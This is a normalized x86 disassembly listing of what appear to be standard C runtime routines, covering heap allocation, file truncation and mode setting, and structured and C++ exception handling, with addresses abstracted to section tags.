movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_40eee4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_40ef4f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_405d3f
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_405c89
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_40efd1
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_404572
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404538
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_405c89
pop ecx
call sub_405d3f
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_405d3f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405cfd
pop ecx
mov [ esi ] eax
push esi
call sub_405c89
pop ecx
test eax eax
je r-xdata
call sub_405d3f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405cfd
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40f07e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_40efd1
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_40c198
pop ecx
mov ebx eax
call sub_405d3f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_40aef0
add esp 0xc
sub_40f0ec
call sub_40c2b5
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40c2c2
pop ecx
push 0x3
call sub_40603f
int3
push 0x1
push 0x40000015
push 0x3
call sub_407065
add esp 0xc
sub_40f192
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_40c967
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_405d3f
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_40c967
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40c967
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c967
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_40f348
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_405d3f
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_40dcd2
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_405d3f
mov [ eax ] 0xd
call sub_405d52
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_405d52
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_405d3f
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_409356
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40f348
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_40f348
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_40f403
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
push 0x16
pop eax
pop ebp
retn
sub_40f436
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40f46f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40f4c3
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410411
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40f4f9
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_4042ed
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_410411
add esp 0x20
pop esi
pop ebp
retn
sub_40f52c
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40f603
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_407dbd
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_40f603
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_4042ed
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_410411
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40f52c
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40f46f
pop ebx
leave
retn
sub_40f6a2
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_40c217
call sub_40c217
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_40f715
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_407dbd
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_407dbd
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_40f741
mov edi edi
push ebp
mov ebp esp
call sub_407dbd
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_40f768
mov edi edi
push ebp
mov ebp esp
push esi
call sub_407dbd
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_407dbd
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_407dbd
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_40c217
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_40f7ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40f4f9
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_410500
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40f825
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_405ae9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40445e
pop ecx
sub_40f84c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40b8d0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_40f8ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_407dbd
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_407dbd
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_407dbd
and [ eax + 0x90 ] 0x0
jmp sub_40c1cb
sub_40f8fa
push 0x10
push r--data
call sub_409f90
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f9bc
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_407dbd
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_409fd5
retn
call sub_40c217
call sub_40c217
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_410500
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40f9d6
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_407dbd
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_40fa1b
push 0x8
push r--data
call sub_409f90
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_409fd5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_40f468
mov [ ebp - 0x4 ] 0xfffffffe
sub_40fa70
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40fa99
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_40c217
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_40f84c
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_40fb5d
push 0x2c
push r--data
call sub_409f90
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_40f715
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_407dbd
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_407dbd
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_407dbd
mov [ eax + 0x88 ] esi
call sub_407dbd
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_40f7ba
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_40fc83
mov eax [ ebp - 0x1c ]
call sub_409fd5
retn
sub_40fbf6
mov esp [ ebp - 0x18 ]
call sub_407dbd
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_40f8fa
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_40fc83
mov eax [ ebp - 0x1c ]
call sub_409fd5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_40fc83
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_40f768
pop ecx
call sub_407dbd
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_407dbd
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_40f741
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_40fa1b
pop ecx
pop ecx
sub_40fcf9
push 0xc
push r--data
call sub_409f90
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40c217
push ebx
push esi
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_410582
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_4105a0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_410582
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_40fa70
pop ecx
pop ecx
push eax
push esi
call sub_4105a0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_409fd5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_40fa70
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_40fe78
push 0x8
push r--data
call sub_409f90
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_40fa70
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_40f468
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_40fcf9
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409fd5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_40fa70
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_40f468
jmp r-xdata
sub_40ff0a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40fe78
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
